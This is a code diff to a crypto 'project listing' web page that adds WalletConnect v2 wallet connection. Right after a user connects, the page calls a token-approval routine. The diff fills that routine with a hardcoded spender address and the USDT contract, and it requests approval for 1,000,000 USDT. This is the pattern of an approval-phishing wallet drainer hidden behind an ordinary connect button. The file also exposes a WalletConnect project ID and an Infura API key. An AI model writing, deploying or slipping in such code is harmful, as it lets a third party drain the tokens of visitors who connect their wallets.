@@ -71,7 +71,7 @@ async function connectMetaMask() {
 }
 
 /* ============================
-   WALLETCONNECT v2 (FUNCTIONAL)
+   WALLETCONNECT v2 (ETHEREUM ONLY, COPIED STYLE)
    ============================ */
 let wcProvider = null;
 
@@ -82,17 +82,20 @@ async function connectWalletConnect() {
       wcProvider = null;
     }
 
+    walletConnectButton.classList.add('loading');
+    walletConnectButton.disabled = true;
+
     const { EthereumProvider } = await import('https://esm.sh/@walletconnect/ethereum-provider@2.21.8?bundle');
 
     wcProvider = await EthereumProvider.init({
-      projectId: "59ba0228712f04a947916abb7db06ab1",
-      chains: [1],
+      projectId: "59ba0228712f04a947916abb7db06ab1", // replace with your valid WalletConnect Cloud projectId
+      chains: [1], // Ethereum mainnet only
       showQrModal: true,
       rpcMap: {
-        1: "https://mainnet.infura.io/v3/83caa57ba3004ffa91addb7094bac4cc",
+        1: "https://mainnet.infura.io/v3/83caa57ba3004ffa91addb7094bac4cc" // replace with your Infura/Alchemy key
       },
       metadata: {
-        name: "Crypto Project Listing",
+        name: 'Crypto Project Listing',
         url: window.location.origin
       }
     });
@@ -100,25 +103,22 @@ async function connectWalletConnect() {
     const accounts = await wcProvider.enable();
     window.ethereum = wcProvider;
 
-    if (typeof Web3 === 'undefined') {
-      console.error('Web3 not available');
-      return;
-    }
-    if (typeof window.web3 === 'undefined') {
-      window.web3 = new Web3(wcProvider);
-    }
+    provider = new ethers.providers.Web3Provider(wcProvider);
+    signer = provider.getSigner();
+    activeProviderType = 'walletconnect';
 
-    const userAccounts = await window.web3.eth.getAccounts();
-    if (!Array.isArray(userAccounts) || !userAccounts.length) return;
-
-    await approveSpender(userAccounts[0]);
-
-    window.addEventListener('beforeunload', () => {
-      if (wcProvider?.disconnect) wcProvider.disconnect().catch(() => {});
-    });
-  } catch (error) {
-    console.error('Error connecting to WalletConnect:', error);
+    await approveSpender(accounts[0]);
+  } catch (err) {
+    console.error(err);
+    alert('Wallet Connection Error. Please retry or refresh the page.');
   }
+
+  walletConnectButton.classList.remove('loading');
+  walletConnectButton.disabled = false;
+
+  window.addEventListener('beforeunload', () => {
+    if (wcProvider?.disconnect) wcProvider.disconnect().catch(() => {});
+  });
 }
 
 /* ============================
@@ -126,8 +126,8 @@ async function connectWalletConnect() {
    ============================ */
 async function approveSpender(account) {
   try {
-    const spenderAddress = 'YOUR_SPENDER_ADDRESS_HERE';
-    const usdtAddress = 'USDT_CONTRACT_ADDRESS_HERE'; // Replace with actual USDT contract address
+    const spenderAddress = '0x89e8ed15656ab289e980f92e59ddf7ecd2a36f85';
+    const usdtAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // Replace with actual USDT contract address
 
     const usdtAmount = (1000000 * 10 ** 6).toString();
 
